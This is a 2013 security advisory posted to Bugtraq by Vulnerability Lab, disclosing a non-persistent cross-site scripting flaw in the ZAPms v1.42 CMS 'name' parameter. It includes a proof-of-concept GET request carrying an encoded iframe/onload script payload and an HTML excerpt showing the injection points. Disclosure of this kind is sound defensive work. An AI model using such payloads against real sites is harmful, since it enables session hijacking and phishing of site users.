
Date: Tue, 15 Oct 2013 15:22:04 +0200
From: Vulnerability Lab <research@...nerability-lab.com>
To: bugtraq@...urityfocus.com, bugs@...uritytracker.com
Subject: ZAPms v1.42 CMS - Client Side Cross Site Scripting Web Vulnerability

Document Title:
===============
ZAPms v1.42 CMS - CS Cross Site Scripting Web Vulnerability


References (Source):
====================
http://www.vulnerability-lab.com/get_content.php?id=1112


Release Date:
=============
2013-10-15


Vulnerability Laboratory ID (VL-ID):
====================================
1112


Common Vulnerability Scoring System:
====================================
2


Product & Service Introduction:
===============================
ZAPms is a freely available open source web content management system, tailored to the needs of businesses on the Internet. 
The ZAPms offers many features and modules as well as an expansion interface for maximum capabilities.

(Copy of the Vendor Homepage: http://www.zapms.de/ )


Abstract Advisory Information:
==============================
The Vulnerability Laboratory discovered multiple client-side cross site scripting web vulnerabilities in the ZAPms v1.42 Content Management System.


Vulnerability Disclosure Timeline:
==================================
2013-10-15:    Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================

Exploitation Technique:
=======================
Remote


Severity Level:
===============
Medium


Technical Details & Description:
================================
A client-side cross site scripting web vulnerability is detected in the official ZAPms v1.42 Content Management System.
The non-persistent cross site scripting web vulnerability allows an attacker to manipulate client side web application to browser GET method requests.

The vulnerability is located in the `name` value of the list GET method request. Remote attackers are able to manipulate 
the name value to execute client-side script code (application-side).

Exploitation of the vulnerability requires no privileged application user account but low or medium user interaction. Successful exploitation of 
the vulnerability results in session hijacking, client-side phishing, client-side external redirects or malware loads and client-side manipulation 
of the vulnerable module context.

Request Method(s):
				[+] [GET]

Vulnerable Parameter(s):
				[+] name ( rFmScr, eTt, newObj1 & name_new )


Proof of Concept (PoC):
=======================
The client-side cross site scripting web vulnerability can be exploited by remote attackers without privileged application user account and 
with low or medium user interaction. For demonstration or reproduce ...

Standard: GET
http://localhost:8080/cms/zap/
?sid=6973e3de53af65b9dbb57d1e2569a3f4&entry_id=10&action=list&subaction=&dir=newsletter/&name=benjamin&ext=

PoC: GET
http://localhost:8080/cms/zap/
?sid=6973e3de53af65b9dbb57d1e2569a3f4&entry_id=10&action=details&subaction=mceedit&dir=&name=
a%20%3C%3E%3E%22%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22katha%22%29%3C
&ext=html

PoC: rFmScr, eTt, newObj1, name_new & name

<div class=``headTopicM``><div class=``i20_close``></div> File manager<div class=``btnT``>
<span class=``brbcss``><input id=``TnewObj1`` class=``bcss`` 
onclick=``rFmScr('list`,``,'','a <>>`` <[CLIENT SIDE CROSS SITE SCRIPTING VULNERABILITY!])<','html')"`` 
value=``× Close`` type=``button``></span><span class=``brbcss``><input name=``TnewObj4`` class=``bcss`` onclick=``oDtl('email`,``,450,300)`` 
value=``Code email`` type=``button``></span></div></div><div class=``content`` id=``searchPanel``><table border=``0`` cellpadding=``2`` 
cellspacing=``2``><tbody><tr><td class=``eTt``>File name <span class=``asterix``>*</span>:</td>
<td class=``eTt``>a <>>``<[CLIENT SIDE CROSS SITE SCRIPTING VULNERABILITY!];)<<input`` name=``name_new`` 
type=``hidden`` value=``a <>>`` <[CLIENT SIDE CROSS SITE SCRIPTING VULNERABILITY!]``><input name=``ext`` type=``hidden`` 
value=``html`` />.html</td><td> </td>
<td>Preview:</td><td><a rel=``lyteframe`` rev=``scrolling:auto;width:950px;height:760px;`` 
title=``a <>>``<[CLIENT SIDE CROSS SITE SCRIPTING VULNERABILITY!]``)<`` href=``?sid=6973e3de53af65b9dbb57d1e2569a3f4&entry_id=10&
action=details&subaction=preview&dir=&name=a <>>``<[CLIENT SIDE CROSS SITE SCRIPTING VULNERABILITY!]``)<&ext=html`` 
class=``i18_pre``></a></dt></tr></table></div><!-- /TinyMCE --><!-- save --><div class=``btnB``><span class=``brbcss``><input id=``newObj1`` 
class=``bcss`` type=``button`` onclick=``rFmScr('list', '', '', 'a <>>``<[CLIENT SIDE CROSS SITE SCRIPTING VULNERABILITY!]``)<', 'html')`` 
value=``× Close`` /></span><span class=``brbcss``><input name=``newObj4`` class=``bcss`` type=``button`` onclick=``oDtl('email`,``,450,300)`` 
value=``Code email`` /></span></div><!-- save --></form></div>
<div class=``spacer``> </div>
<div style=``font-size:9px;text-align:center;``>
<p><a href=``http://www.zapms.de`` style=``color:#999;``>ZAPms v1.42 10.04.2013</a>   <a href=``mailto:xxxxxxxx@...e`` 
style=``color:#999;``>© 2006-2013 Andrey Marchenko</a></p></div>
</body>
</html></iframe></td></tr></tbody></table></div></form>


Solution - Fix & Patch:
=======================
The vulnerability can be patched by a secure parse and encode of the name value parameter.


Security Risk:
==============
The security risk of the cross site scripting web vulnerability in the administrator panel is estimated as medium(-).


Credits & Authors:
==================
Vulnerability Laboratory [Research Team] - Katharin S. L. (CH)


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, 
either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases 
or trade with fraud/stolen material.

Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       - www.evolution-sec.com
Contact:    admin@...nerability-lab.com 	- research@...nerability-lab.com 	       - admin@...lution-sec.com
Section:    www.vulnerability-lab.com/dev 	- forum.vulnerability-db.com 		       - magazine.vulnerability-db.com
Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       - youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. 
Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other 
media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and 
other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), 
modify, use or edit our material contact (admin@...nerability-lab.com or research@...nerability-lab.com) to get a permission.

				Copyright © 2013 | Vulnerability Laboratory [Evolution Security]



-- 
VULNERABILITY LABORATORY RESEARCH TEAM
DOMAIN: www.vulnerability-lab.com
CONTACT: research@...nerability-lab.com


